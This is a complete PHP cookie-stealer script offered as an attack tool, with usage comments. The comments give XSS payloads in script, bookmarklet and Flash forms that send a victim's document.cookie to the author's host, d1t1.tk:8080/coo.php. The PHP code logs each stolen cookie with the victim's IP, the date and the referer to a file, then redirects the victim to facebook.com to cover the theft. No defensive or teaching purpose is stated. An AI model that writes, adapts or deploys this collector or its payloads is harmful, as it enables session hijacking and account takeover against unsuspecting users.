<?php
# Cookie Stealer PHP Script ####### by d1t1 #######
# Save it as coo.php and create a file empty named "cookies" and with permissions 622 (chmod 622 cookies)
# It doenst work for facebook because facebook.com cookies has the "HttpOnly" flag (unable to get the datr cookie that authenticates at facebook)
#########################################################################################################################
# USAGE                                                                                                                 #
# SCRIPT MODE:                                                                                                          #
# <script language="Javascript"> document.location="http://d1t1.tk:8080/coo.php?"c=+document.cookie; </script>          #
#                                                                                                                       #
# TEST MODE:                                                                                                            #
# <script language="Javascript"> document.location='http://localhost/coo.php?c='+escape(document.cookie); </script>     #
#                                                                                                                       #
# MANUAL MODE:                                                                                                          #
# javascript:void(document.location='http://main/coo.php?c='+escape(document.cookie));                                  #
#                                                                                                                       #
# FLASHMOVIE MODE:                                                                                                      #
# getUrl("javascript:document.location='http://d1t1.tk:8080/coo.php?'c=+document.cookie;");                             #
#########################################################################################################################
 
$cookie = $_GET['c'];
$ip = getenv ('REMOTE_ADDR');
$date = date("H:i dS F");
$referer=getenv ('HTTP_REFERER');
$fp = fopen('cookies', 'a');
fwrite($fp, "IP:      " . $ip . "\r\n");
fwrite($fp, "Date:    " .$date. "\r\n");
fwrite($fp, "Referer: " . $referer . "\r\n" );
fwrite($fp, "Cookie:  " . $cookie . "\r\n***************************************************************\r\n");
fclose($fp);
header ("Location: http://www.facebook.com"); /* USE IF WANT TO REDIRECT TO ANOTHER PAGE */
?>
